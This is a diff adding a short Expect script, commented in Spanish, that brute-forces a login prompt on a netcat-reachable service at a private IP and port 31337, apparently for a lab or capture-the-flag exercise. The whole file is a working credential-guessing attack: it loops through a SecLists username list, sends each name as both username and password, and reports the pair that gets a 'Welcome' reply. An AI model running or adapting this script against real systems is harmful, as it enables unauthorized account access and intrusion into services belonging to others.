@@ -1,0 +1,56 @@
+#!/usr/bin/expect
+
+# Define la dirección IP y el puerto
+set ip "192.168.0.103"
+set port "31337"
+
+# Lee el archivo con las credenciales
+set archivo_credenciales "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
+
+# Abre el archivo de credenciales en modo lectura
+set archivo [open $archivo_credenciales r]
+
+# Loop para leer cada línea del archivo
+while {[gets $archivo linea] != -1} {
+    # Utiliza la misma línea para nombre de usuario y contraseña
+    set username $linea
+    set password $linea
+
+    # Inicia la conexión con Netcat
+    spawn nc $ip $port
+
+    # Espera la respuesta "username>"
+    expect "username>"
+
+    # Envía el nombre de usuario
+    send "$username\r"
+
+    # Espera la solicitud de contraseña "password>"
+    expect "password>"
+
+    # Envía la contraseña
+    send "$password\r"
+
+    # Espera una respuesta de autenticación (personaliza según la respuesta esperada)
+    expect {
+        "Welcome" {
+            puts "Credenciales correctas: $username / $password"
+            break;
+            # Puedes agregar aquí acciones adicionales si se autentica con éxito
+        }
+        "authentication failed" {
+            puts "Credenciales incorrectas: $username / $password"
+        }
+        timeout {
+            puts "Tiempo de espera agotado para $username / $password"
+        }
+    }
+
+    # Cierra la conexión con Netcat
+    send "exit\r"
+    expect eof
+}
+
+# Cierra el archivo de credenciales
+close $archivo
+
